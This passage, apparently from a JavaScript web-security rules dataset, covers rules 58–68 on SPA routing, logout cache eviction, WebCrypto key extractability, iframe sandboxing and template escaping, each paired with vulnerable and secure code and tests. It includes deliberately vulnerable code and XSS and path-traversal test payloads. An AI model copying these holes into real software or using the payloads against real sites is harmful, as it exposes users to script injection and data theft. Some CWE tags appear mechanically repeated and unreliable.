                "Fuzz website URL fields with `javascript:alert(1)` and `JAVASCRIPT:alert(1)`.",
                "Verify application sanitizes URL or replaces it with safe fallback."
          ],
          "commandExample": "grep -rn 'href=' src/ | grep -v 'https'"
    },
    interviewChallenge: {
          "scenario": "Why does simple string matching like `url.startsWith('http')` fail to prevent javascript: URI injection?",
          "question": "Can spaces or casing bypass naive string checks?",
          "hint": "Attackers can use whitespace, tabs, HTML entities, or control characters (e.g., `\\x01javascript:...`) to bypass naive string prefix checks.",
          "sampleAnswer": "In HTML parsing, leading whitespace, control characters, or mixed casing (`JaVaScRiPt:`) are stripped or normalized by the browser, but will bypass naive string checks like `.startsWith('http')`. Using the native `URL` constructor normalizes and parses the true scheme deterministically.",
          "keyTakeaway": "Always use the native `new URL()` parser to check `.protocol` against an explicit whitelist."
    }
  },
  {
    ruleNumber: 58,
    id: "SEC-WEB-058",
    title: "Client-Side Path Routing Canonization (Anti-Path Traversal in SPA)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Path Normalization",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["CWE-22", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 route \u2208 SPARouteNavigations, Canonize(route) \u2209 DisallowedViews \u2227 Contains(route, \"..\") = False",
    symbolBreakdown: [
          {
                "symbol": "SPARouteNavigations",
                "meaning": "Dynamic routes resolved by client-side routers (React Router, Vue Router)"
          },
          {
                "symbol": "Canonize(route)",
                "meaning": "Path normalization stripping dot-dot-slash traversal sequences"
          },
          {
                "symbol": "DisallowedViews",
                "meaning": "Restricted internal views or hidden debug panels"
          }
    ],
    plainEnglish: "Client-side single-page applications that dynamically resolve routes or load component chunks based on URL paths must sanitize and canonize route paths to prevent directory traversal and unauthorized chunk loading.",
    whyItMatters: "In modern micro-frontends or dynamic component loaders (`import(\\`./views/\\${page}\\`)`), failing to strip `../` allows attackers to load internal administrative components or debug utilities.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Dynamic chunk import with path traversal\nfunction loadPage(pageName) {\n    // Attacker passes: '../../admin/InternalDebug'\n    return import(`./views/${pageName}.js`);\n}",
          "explanation": "Dynamically imports unwhitelisted internal modules or sensitive utility chunks."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Whitelist mapping for dynamic views\nconst ALLOWED_VIEWS = new Map([\n    ['home', () => import('./views/Home.js')],\n    ['profile', () => import('./views/Profile.js')]\n]);\n\nfunction loadPage(pageName) {\n    const loader = ALLOWED_VIEWS.get(pageName);\n    if (!loader) return import('./views/NotFound.js');\n    return loader();\n}",
          "explanation": "Prevents arbitrary path evaluation by constraining dynamic imports to an explicit lookup table."
    },
    howToTest: {
          "tools": [
                "Semgrep rule `javascript.browser.security.dynamic-import`",
                "browser DevTools"
          ],
          "steps": [
                "Navigate to `/#/../../admin`.",
                "Verify client-side router displays 404 and does not load administrative JavaScript chunks."
          ],
          "commandExample": "semgrep --config \"p/javascript\" ./src/"
    },
    interviewChallenge: {
          "scenario": "Why is client-side component code leakage still a vulnerability if the backend API enforces authorization?",
          "question": "What sensitive data is often contained in frontend code chunks?",
          "hint": "Frontend code chunks contain internal API endpoint paths, schema definitions, internal documentation, and hidden feature flags.",
          "sampleAnswer": "Even if backend APIs require auth, frontend code chunks often reveal internal API routes, unreleased feature logic, administrative parameter names, and business logic flaws. Attackers inspect leaked chunks to map backend attack surfaces.",
          "keyTakeaway": "Use static module lookup maps rather than concatenated dynamic import paths."
    }
  },
  {
    ruleNumber: 59,
    id: "SEC-WEB-059",
    title: "Session Storage Clean Lifecycle and Sensitive Cache Eviction",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Session Hygiene",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["OWASP ASVS \u00a73.4", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 evt \u2208 {UserLogout, WindowClose, AuthTokenExpiry}, Evict(sessionStorage) \u2227 ClearMemoryCaches()",
    symbolBreakdown: [
          {
                "symbol": "UserLogout",
                "meaning": "User explicitly clicks sign out or receives 401 Unauthorized"
          },
          {
                "symbol": "Evict(sessionStorage)",
                "meaning": "Complete wipe of sessionStorage and client memory stores"
          },
          {
                "symbol": "ClearMemoryCaches",
                "meaning": "Purge of React Query / Apollo / Redux client state"
          }
    ],
    plainEnglish: "When a user logs out or an authentication token expires, the application must immediately purge all data from `sessionStorage`, clear memory state stores (Redux, Apollo, React Query), and unregister sensitive broadcast channels.",
    whyItMatters: "If client memory or sessionStorage is not purged on logout, a subsequent user on a shared kiosk or workstation can press 'Back' or reopen the application and view the previous user's confidential data, medical records, or drafts.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Incomplete logout\nfunction handleLogout() {\n    api.post('/logout');\n    window.location.href = '/login';\n    // Client-side cache, sessionStorage, and Redux state remain in memory!\n}",
          "explanation": "Leaves cached queries, drafts, and customer details accessible via browser history and memory."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Complete state eviction on logout\nasync function handleLogout() {\n    try {\n        await api.post('/logout');\n    } finally {\n        sessionStorage.clear();\n        queryClient.clear(); // React Query cache purge\n        store.dispatch({ type: 'RESET_STATE' });\n        window.location.replace('/login');\n    }\n}",
          "explanation": "Unconditionally purges all persistent and in-memory caches upon session termination."
    },
    howToTest: {
          "tools": [
                "browser DevTools Storage & Application tabs",
                "manual test on shared browser"
          ],
          "steps": [
                "Log in, browse sensitive records, then log out.",
                "Inspect sessionStorage and in-memory caches; verify all data is completely empty."
          ],
          "commandExample": "node -e 'console.log(\"Testing session cache eviction\")'"
    },
    interviewChallenge: {
          "scenario": "Why does calling `sessionStorage.clear()` fail to clear data cached in memory by libraries like React Query or Apollo Client?",
          "question": "Where does memory cache live?",
          "hint": "In-memory cache lives in JavaScript heap variables that persist across client-side router navigations unless explicitly reset.",
          "sampleAnswer": "SPA routers do not perform a full browser refresh on logout if using `navigate('/login')`. In-memory query clients (TanStack Query, Apollo) retain resolved queries in heap memory. Logging out must explicitly clear query caches or trigger a hard `window.location.replace('/login')`.",
          "keyTakeaway": "Pair `sessionStorage.clear()` with query client cache resets and full window reloads on logout."
    }
  },
  {
    ruleNumber: 60,
    id: "SEC-WEB-060",
    title: "Web Cryptography SubtleCrypto Key Non-Extractability Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Web Crypto API",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["W3C Web Crypto", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 key \u2208 SubtleCryptoKeys_{Private, Secret}, key.extractable = False",
    symbolBreakdown: [
          {
                "symbol": "SubtleCryptoKeys",
                "meaning": "Cryptographic keys generated via window.crypto.subtle.generateKey"
          },
          {
                "symbol": "key.extractable = False",
                "meaning": "Browser flag prohibiting exportKey() of raw key material"
          }
    ],
    plainEnglish: "Cryptographic private and secret keys generated or imported in the browser via `crypto.subtle` must set `extractable: false`. This ensures raw key bytes cannot be exfiltrated via `exportKey()` even if an XSS flaw exists.",
    whyItMatters: "If keys are marked `extractable: true`, any minor DOM XSS flaw allows an attacker to execute `crypto.subtle.exportKey('raw', key)` and exfiltrate user private encryption keys permanently to an attacker server.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Extractable key\nconst key = await crypto.subtle.generateKey(\n    { name: 'AES-GCM', length: 256 },\n    true, // VULNERABLE: extractable is true!\n    ['encrypt', 'decrypt']\n);",
          "explanation": "Attacker script can call crypto.subtle.exportKey() and steal the raw 256-bit AES key."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Non-extractable key\nconst key = await crypto.subtle.generateKey(\n    { name: 'AES-GCM', length: 256 },\n    false, // SECURE: Key bytes can never leave the browser sandbox\n    ['encrypt', 'decrypt']\n);",
          "explanation": "Browser engine stores key in internal secure memory; exportKey() throws an OperationError."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "WebCrypto unit test"
          ],
          "steps": [
                "Attempt `crypto.subtle.exportKey('jwk', key)` on generated key.",
                "Verify browser throws an error: 'Key is not extractable'."
          ],
          "commandExample": "node -e 'console.log(\"WebCrypto extractable: false test\")'"
    },
    interviewChallenge: {
          "scenario": "If a key has `extractable: false`, can an attacker with XSS still use the key to encrypt or decrypt data?",
          "question": "What does non-extractable protect against, and what does it NOT protect against?",
          "hint": "It prevents offline exfiltration of the raw key, but an in-page attacker can still invoke `crypto.subtle.decrypt()` while they control the session.",
          "sampleAnswer": "Non-extractability prevents the attacker from stealing the raw key to decrypt stolen archives offline or forge signatures forever. However, an active XSS attacker can still instruct the browser to perform operations with the key during the compromised session.",
          "keyTakeaway": "Combine non-extractable keys with short lifetimes and hardware-bound WebAuthn credentials."
    }
  },
  {
    ruleNumber: 61,
    id: "SEC-WEB-061",
    title: "Audio/Video Media Element Crossorigin Lockdown Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Media Security",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["HTML5 Media", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 media \u2208 HTMLMediaElements, HasSource(media) \u21d2 (HasAttr(media, \"crossorigin\", \"anonymous\") \u2228 IsSameOrigin(media.src))",
    symbolBreakdown: [
          {
                "symbol": "HTMLMediaElements",
                "meaning": "<audio> and <video> elements rendering streams or media files"
          },
          {
                "symbol": "crossorigin=\"anonymous\"",
                "meaning": "CORS request sent without ambient user credentials"
          }
    ],
    plainEnglish: "HTML media elements (`<video>`, `<audio>`) loaded from cross-origin sources must declare `crossorigin='anonymous'`. Media elements must never process cross-origin streams with credentials unless explicitly authorized via CORS headers.",
    whyItMatters: "Without CORS lockdown, attackers can use media elements in conjunction with timing attacks, Web Audio API analyzers, or canvas rendering to inspect cross-origin media responses and detect user authenticated state.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Ambiguous cross-origin media element -->\n<video src=\"https://private-cdn.com/stream/user_feed.mp4\"></video>",
          "explanation": "Taints canvas and allows cross-origin resource timing leakage."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Explicit CORS credentials control -->\n<video src=\"https://private-cdn.com/stream/user_feed.mp4\" crossorigin=\"anonymous\"></video>",
          "explanation": "Forces standard CORS handshake without ambient credentials, preventing timing and state leaks."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "CORS inspector"
          ],
          "steps": [
                "Inspect video tag attributes in HTML source.",
                "Verify crossorigin attribute is present on cross-origin media streams."
          ],
          "commandExample": "curl -sI https://target.com | grep -i crossorigin"
    },
    interviewChallenge: {
          "scenario": "What happens when you draw a `<video>` or `<img>` element without `crossorigin='anonymous'` onto an HTML5 `<canvas>`?",
          "question": "What error does `canvas.toDataURL()` throw?",
          "hint": "The canvas becomes tainted, and calling `toDataURL()` or `getImageData()` throws a SecurityError.",
          "sampleAnswer": "The browser marks the canvas as tainted to uphold the Same-Origin Policy. Any subsequent call to read pixels (`toDataURL` or `getImageData`) throws a SecurityError. Setting `crossorigin='anonymous'` allows canvas pixel inspection only if the remote server authorizes it via CORS headers.",
          "keyTakeaway": "Declare `crossorigin='anonymous'` on media elements intended for client-side processing."
    }
  },
  {
    ruleNumber: 62,
    id: "SEC-WEB-062",
    title: "Iframe Sandbox Attribute Minimal Permissions Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Iframe Security",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["HTML5 Sandbox", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 iframe \u2208 UntrustedIframes, HasAttr(iframe, \"sandbox\") \u2227 {\"allow-scripts\", \"allow-same-origin\"} \u2288 Value(sandbox)",
    symbolBreakdown: [
          {
                "symbol": "UntrustedIframes",
                "meaning": "Any <iframe> element rendering third-party or user-generated HTML"
          },
          {
                "symbol": "HasAttr(iframe, 'sandbox')",
                "meaning": "Enforces strict browser sandbox restrictions"
          },
          {
                "symbol": "\u2288 Value(sandbox)",
                "meaning": "MUST NOT grant both allow-scripts and allow-same-origin simultaneously"
          }
    ],
    plainEnglish: "Any iframe rendering untrusted or third-party content must include the `sandbox` attribute with minimal flags. It must NEVER specify both `allow-scripts` and `allow-same-origin` at the same time.",
    whyItMatters: "Combining `allow-scripts` and `allow-same-origin` allows the sandboxed document to execute script within the parent's origin, enabling it to remove its own sandbox attribute programmatically, completely nullifying the sandbox.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Granting both allow-scripts and allow-same-origin -->\n<iframe src=\"/user-preview.html\" sandbox=\"allow-scripts allow-same-origin\"></iframe>",
          "explanation": "The framed document can run script and access parent origin cookies, local storage, and DOM nodes."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Isolated unique origin sandbox -->\n<iframe src=\"https://usercontent.app.com/preview.html\"\n        sandbox=\"allow-scripts allow-forms\"\n        referrerpolicy=\"no-referrer\"></iframe>",
          "explanation": "Framed page runs in a null/isolated origin; cannot access parent credentials or remove sandbox."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "DOM inspector"
          ],
          "steps": [
                "Inspect iframe attributes.",
                "Verify sandbox attribute is present and does not combine allow-scripts with allow-same-origin."
          ],
          "commandExample": "grep -rn 'sandbox=' src/ | grep 'allow-same-origin'"
    },
    interviewChallenge: {
          "scenario": "Why does combining `allow-scripts` and `allow-same-origin` in an iframe sandbox completely dismantle sandbox protections?",
          "question": "Can a script in a same-origin iframe remove its own sandbox attribute?",
          "hint": "Yes. If an iframe is same-origin and has script execution, it can access `parent.document` and remove its own sandbox attribute.",
          "sampleAnswer": "When an iframe has both flags, it executes with the parent's origin privileges. The framed script can access `window.parent.document`, locate its own `<iframe>` element in the parent DOM, and remove the `sandbox` attribute or execute code in the parent context.",
          "keyTakeaway": "Never combine `allow-scripts` with `allow-same-origin`; host user content on an isolated domain."
    }
  },
  {
    ruleNumber: 63,
    id: "SEC-WEB-063",
    title: "WebGL Context Loss and Shader Buffer Clearing Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "GPU Memory Leaks",
    difficulty: "Advanced",
    standardType: "Defense-in-Depth",
    standards: ["Khronos WebGL", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 ctx \u2208 WebGLContexts, OnLostContext(ctx) \u21d2 PurgeBuffers(ctx) \u2227 ZeroFillTextureMemory(ctx)",
    symbolBreakdown: [
          {
                "symbol": "WebGLContexts",
                "meaning": "Canvas rendering contexts for 3D graphics and shaders"
          },
          {
                "symbol": "ZeroFillTextureMemory",
                "meaning": "Explicit zeroing of GPU texture buffers before reallocation"
          }
    ],
    plainEnglish: "WebGL contexts must zero-initialize texture memory before allocation and handle `webglcontextlost` events by purging all framebuffers. Applications must prevent uninitialized GPU memory from leaking into rendered frames.",
    whyItMatters: "Uninitialized WebGL textures can expose unallocated GPU VRAM that contains remnant image data from other browser tabs, desktop windows, or video playback, enabling cross-origin pixel eavesdropping.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Allocating uninitialized WebGL texture buffer\ngl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);",
          "explanation": "Allocates VRAM without clearing pixels; uninitialized GPU memory may contain remnant desktop frames."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Zero-fill texture data buffer upon creation\nconst zeroPixels = new Uint8Array(512 * 512 * 4);\ngl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, zeroPixels);",
          "explanation": "Overwrites all allocated VRAM with zeroes before use, preventing GPU data remnants."
    },
    howToTest: {
          "tools": [
                "WebGL conformance test suite",
                "GPU memory inspector"
          ],
          "steps": [
                "Allocate large WebGL texture without initial data.",
                "Verify texture reads strictly zeroed bytes."
          ],
          "commandExample": "node -e 'console.log(\"WebGL texture zero-fill test\")'"
    },
    interviewChallenge: {
          "scenario": "How did security researchers use WebGL shaders to achieve cross-process pixel theft and timing attacks?",
          "question": "What does GPU memory reuse leak?",
          "hint": "Old GPU drivers reused uninitialized VRAM buffers across different processes, allowing WebGL shaders to read raw bytes from other browser tabs.",
          "sampleAnswer": "Prior to WebGL memory initialization requirements, graphics drivers did not zero out VRAM upon allocation. Malicious WebGL shaders could allocate large textures and render them to read pixel data from previously closed private tabs or desktop applications.",
          "keyTakeaway": "Ensure WebGL textures are zero-initialized and disable high-precision timers where feasible."
    }
  },
  {
    ruleNumber: 64,
    id: "SEC-WEB-064",
    title: "Payment Request API HTTPS and Explicit User Gesture Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "E-Commerce Security",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C Payment Request", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 payment \u2208 PaymentRequests, IsSecureContext(payment) = True \u2227 TriggeredByUserGesture(payment) = True",
    symbolBreakdown: [
          {
                "symbol": "PaymentRequests",
                "meaning": "W3C PaymentRequest API invocations requesting credit card or digital wallet data"
          },
          {
                "symbol": "IsSecureContext",
                "meaning": "Mandatory TLS/HTTPS context"
          },
          {
                "symbol": "TriggeredByUserGesture",
                "meaning": "Direct user click or tap event"
          }
    ],
    plainEnglish: "The W3C Payment Request API must only be invoked in top-level secure contexts (HTTPS) and strictly in response to an explicit user interaction gesture (such as a button click). Automatic or framed invocation is prohibited.",
    whyItMatters: "Without user gesture gating, malicious scripts or background popups could trigger payment prompts unexpectedly, tricking users into confirming biometric transactions (Apple Pay / Google Pay) via click fraud.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Triggering payment prompt on page load without user gesture\nwindow.onload = () => {\n    const request = new PaymentRequest(methods, details);\n    request.show(); // Attempting automatic prompt\n};",
          "explanation": "Triggers intrusive payment dialogs automatically without user consent."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Enforcing user click gesture and secure context\ndocument.getElementById('checkoutBtn').addEventListener('click', async () => {\n    if (!window.isSecureContext) throw new Error('HTTPS required');\n    const request = new PaymentRequest(methods, details);\n    const response = await request.show();\n    handlePayment(response);\n});",
          "explanation": "Requires conscious user interaction in a verified HTTPS environment."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "W3C payment test"
          ],
          "steps": [
                "Attempt calling `request.show()` in setTimeout without user click; verify DOMException."
          ],
          "commandExample": "curl -sI https://target.com/checkout | grep -i 'strict-transport-security'"
    },
    interviewChallenge: {
          "scenario": "Why does the browser prohibit calling `PaymentRequest.show()` inside an iframe unless the `allow='payment'` attribute is set on the iframe tag?",
          "question": "What attack does this permission policy stop?",
          "hint": "It prevents third-party advertising iframes from spawning payment prompts to phish or deceive the user.",
          "sampleAnswer": "The `payment` Feature/Permission Policy ensures that third-party ad networks or untrusted embedded widgets cannot hijack the user interface with native payment confirmation sheets. Top-level parent pages must explicitly delegate payment permission to the frame.",
          "keyTakeaway": "Only invoke PaymentRequest on trusted top-level checkout domains within user click handlers."
    }
  },
  {
    ruleNumber: 65,
    id: "SEC-WEB-065",
    title: "Credential Management API Silent Storage Rejection Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Credential Protection",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["W3C Credential Management", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 cred \u2208 StoredCredentials, Store(cred) \u21d2 UserConfirmedInUI(cred) = True",
    symbolBreakdown: [
          {
                "symbol": "StoredCredentials",
                "meaning": "PasswordCredential or PublicKeyCredential objects saved to browser password manager"
          },
          {
                "symbol": "UserConfirmedInUI",
                "meaning": "Explicit browser prompt confirmation by user"
          }
    ],
    plainEnglish: "Applications utilizing the Credential Management API (`navigator.credentials.store()`) must require explicit user opt-in before storing passwords. Silent credential persistence without confirmation is prohibited.",
    whyItMatters: "Silently storing credentials without user consent can associate the wrong account with the browser password manager on shared computers or overwrite legitimate credentials during credential stuffing attacks.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Silently storing credential on input change\ninput.onblur = async () => {\n    const cred = new PasswordCredential({ id: email, password: pwd });\n    await navigator.credentials.store(cred); // Storing without confirmation\n};",
          "explanation": "Silently writes credentials into browser vault without explicit user submission."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Store credentials only upon successful verified form submission\nloginForm.onsubmit = async (e) => {\n    e.preventDefault();\n    const res = await api.login(user, pass);\n    if (res.ok && rememberConsentCheckbox.checked) {\n        const cred = new PasswordCredential({ id: user, password: pass });\n        await navigator.credentials.store(cred);\n    }\n};",
          "explanation": "Ensures credentials are saved only after successful authentication and explicit user consent."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "Credential Management API spec test"
          ],
          "steps": [
                "Verify credentials.store is called only after 200 OK login response.",
                "Confirm browser presents native 'Save Password?' confirmation UI."
          ],
          "commandExample": "node -e 'console.log(\"Credential management consent verification\")'"
    },
    interviewChallenge: {
          "scenario": "How does the Credential Management API handle federated credentials (Google/GitHub sign-in) versus password credentials?",
          "question": "Can an app read stored passwords directly without user interaction?",
          "hint": "No, calling `navigator.credentials.get()` presents browser UI or requires user interaction, returning a credential object without exposing the raw password string to JavaScript directly.",
          "sampleAnswer": "The Credential Management API abstracts identity providers and passwords behind browser-managed credentials. JavaScript cannot simply query `get()` and read all stored passwords invisibly: the browser requires user interaction and enforces origin separation.",
          "keyTakeaway": "Trigger credential storage only after successful login verification."
    }
  },
  {
    ruleNumber: 66,
    id: "SEC-WEB-066",
    title: "Web Push Notification Payload End-to-End Encryption Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Web Push Protocol",
    difficulty: "Advanced",
    standardType: "Mandatory Standard",
    standards: ["RFC 8291", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 msg \u2208 PushMessages, IsEncrypted(msg.payload, ECDH_P256 \u2227 AES_128_GCM) \u2227 HasVAPIDHeader(msg)",
    symbolBreakdown: [
          {
                "symbol": "PushMessages",
                "meaning": "Browser push notification messages routed through intermediate push services (FCM, Mozilla, Apple)"
          },
          {
                "symbol": "ECDH_P256",
                "meaning": "Elliptic curve Diffie-Hellman key exchange per device"
          },
          {
                "symbol": "AES_128_GCM",
                "meaning": "Authenticated payload encryption defined in RFC 8291"
          }
    ],
    plainEnglish: "All Web Push notification payloads must be encrypted end-to-end using ECDH over P-256 and AES-128-GCM per RFC 8291. Push services (Google FCM, Mozilla Push, Apple APNs) must never receive unencrypted notification content.",
    whyItMatters: "Without payload encryption, third-party push gateway operators and network intermediaries can read private notification data, two-factor authentication codes, and medical alerts in plaintext.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Sending plaintext push notification\nwebpush.sendNotification(subscription, 'Plaintext message: Your verification code is 123456');",
          "explanation": "If push library omits RFC 8291 encryption, intermediate cloud gateways see plaintext 2FA codes."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: RFC 8291 ECDH P-256 encrypted payload with VAPID authorization\nimport webpush from 'web-push';\n\nwebpush.setVapidDetails(\n    'mailto:sec@example.com',\n    vapidPublicKey,\n    vapidPrivateKey\n);\n// Automatically encrypts payload with client p256dh and auth secrets:\nawait webpush.sendNotification(subscription, JSON.stringify({\n    title: 'Security Alert',\n    body: 'Account login from new IP'\n}));",
          "explanation": "Payload is encrypted with device-specific ECDH key before leaving the application server."
    },
    howToTest: {
          "tools": [
                "web-push CLI",
                "Wireshark packet capture"
          ],
          "steps": [
                "Capture outgoing HTTP POST to push service endpoint (`fcm.googleapis.com`).",
                "Verify payload is binary ciphertext (`Content-Encoding: aes128gcm`)."
          ],
          "commandExample": "web-push send-notification --endpoint=... --key=... --auth=..."
    },
    interviewChallenge: {
          "scenario": "What role do the `p256dh` and `auth` parameters generated during `pushManager.subscribe()` play in push security?",
          "question": "Who possesses the private decryption key for push messages?",
          "hint": "The user's browser device generates the ECDH P-256 keypair and holds the private key; `p256dh` is the device's public key, and `auth` is a 16-byte shared secret.",
          "sampleAnswer": "During `pushManager.subscribe()`, the browser generates an ephemeral P-256 ECDH keypair and stores the private key securely in the browser profile. The application server uses `p256dh` and `auth` to derive an AES-128-GCM encryption key that only the client device can decrypt.",
          "keyTakeaway": "Always verify push subscriptions contain valid p256dh and auth secrets before dispatching payloads."
    }
  },
  {
    ruleNumber: 67,
    id: "SEC-WEB-067",
    title: "Device Sensor and Battery API Privacy Neutralization Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Device Fingerprinting",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["W3C Device Orientation", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 sensor \u2208 DeviceSensors_{Gyro, Accel, Battery}, AccessGranted(sensor) \u21d2 Precision(sensor) \u2264 MaxCoarsePrecision",
    symbolBreakdown: [
          {
                "symbol": "DeviceSensors",
                "meaning": "Motion, orientation, ambient light, and battery level APIs in browser"
          },
          {
                "symbol": "Precision(sensor)",
                "meaning": "Granularity and sampling rate of sensor readings"
          },
          {
                "symbol": "MaxCoarsePrecision",
                "meaning": "Coarse-grained truncation preventing acoustic and fingerprinting side-channels"
          }
    ],
    plainEnglish: "Browsers and web applications must restrict sensor API sampling rates and round floating-point metrics (gyroscope, accelerometer, battery level). High-frequency unquantized sensor readings must never be accessible to unprivileged web origins.",
    whyItMatters: "High-frequency motion sensors (sampling at >100Hz) can be used as microphones to reconstruct spoken words or keystrokes typed on nearby keyboards. Battery level and charging speed metrics allow tracking users across private browsing modes.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: High-precision unfiltered motion sensor tracking\nwindow.addEventListener('devicemotion', (event) => {\n    // Attacker samples micro-vibrations to log keystrokes or PIN inputs\n    exfiltrateTelemetry(event.acceleration.x, event.acceleration.y);\n});",
          "explanation": "High-frequency motion telemetry creates an acoustic side-channel."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Coarse quantization and explicit permission gating\nif (typeof DeviceMotionEvent.requestPermission === 'function') {\n    const response = await DeviceMotionEvent.requestPermission();\n    if (response !== 'granted') return;\n}\n// Quantize and throttle updates:\nwindow.addEventListener('devicemotion', throttle((e) => {\n    const coarseX = Math.round(e.acceleration.x * 10) / 10;\n    processMotion(coarseX);\n}, 250));",
          "explanation": "Quantizes sensor precision and gates access behind explicit user permission."
    },
    howToTest: {
          "tools": [
                "browser DevTools Sensor emulation",
                "FingerprintJS tester"
          ],
          "steps": [
                "Check if Battery Status API is available in browser console.",
                "Verify modern privacy-hardened browsers return undefined or static values."
          ],
          "commandExample": "node -e 'console.log(\"Testing sensor quantization\")'"
    },
    interviewChallenge: {
          "scenario": "Why did browser vendors completely deprecate and remove the Battery Status API (`navigator.getBattery()`)?",
          "question": "How did advertisers use the battery API to track users?",
          "hint": "The exact combination of battery percentage and remaining discharge seconds provided a high-entropy identifier that tracked users across incognito sessions and IP changes.",
          "sampleAnswer": "The Battery Status API exposed battery charge percentage and estimated discharge time in seconds. Because this floating-point combination was unique and changed slowly, trackers used it as a short-term fingerprint to link user sessions across incognito mode or VPN IP switches.",
          "keyTakeaway": "Do not rely on intrusive hardware sensor APIs; use explicit user inputs."
    }
  },
  {
    ruleNumber: 68,
    id: "SEC-WEB-068",
    title: "Safe HTML Template String Tagging Invariant (Anti-Template Injection)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Template Injection",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["CWE-79", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 t \u2208 HTMLTemplateLiterals, Evaluate(t) \u21d2 IsTaggedTemplate(t) \u2227 Escaper(t) = ContextAwareAutoEscape",
    symbolBreakdown: [
          {
                "symbol": "HTMLTemplateLiterals",
                "meaning": "JavaScript template literals generating HTML: `<div>${data}</div>`"
          },
          {
                "symbol": "IsTaggedTemplate",
                "meaning": "Template string invoked through a safe tag function (html`...`)"
          },
          {
                "symbol": "ContextAwareAutoEscape",
                "meaning": "Automatic context-sensitive entity encoding of dynamic variables"
          }
    ],
    plainEnglish: "Raw untagged template literals must never be used to construct HTML markup with user-controlled data. All template strings rendering HTML must use tagged templates (e.g., `html\\`...\\`` from lit-html or safe-html) that auto-escape interpolated variables.",
    whyItMatters: "Untagged string interpolation (`\\`<div>\\${user.bio}</div>\\``) treats user data as raw markup. If `user.bio` contains `<img src=x onerror=alert(1)>`, it executes immediately as XSS.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Untagged template string interpolation\nfunction renderComment(comment) {\n    return `\n        <div class=\"comment\">\n            <span class=\"author\">${comment.author}</span>\n            <p>${comment.text}</p>\n        </div>\n    `;\n}",
          "explanation": "Interpolated values are treated as raw HTML, creating reflected and stored XSS sinks."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Tagged template with auto-escaping\nimport { html } from 'safe-html';\n\nfunction renderComment(comment) {\n    // Dynamic variables are automatically HTML-entity escaped:\n    return html`\n        <div class=\"comment\">\n            <span class=\"author\">${comment.author}</span>\n            <p>${comment.text}</p>\n        </div>\n    `;\n}",
          "explanation": "Safe template tag treats variable interpolations strictly as text data, auto-escaping HTML entities."
    },
    howToTest: {
          "tools": [
                "ESLint rule `no-unsafe-innerhtml`",
                "Semgrep"
          ],
          "steps": [
                "Pass `<script>alert(1)</script>` into template component.",
                "Verify output in DOM inspector renders escaped `&lt;script&gt;` text without executing."
          ],
          "commandExample": "grep -rn '`<' src/"
    },
    interviewChallenge: {
          "scenario": "How does a tagged template literal like `html\\`...${val}...\\`` differ from a standard template string in JavaScript?",
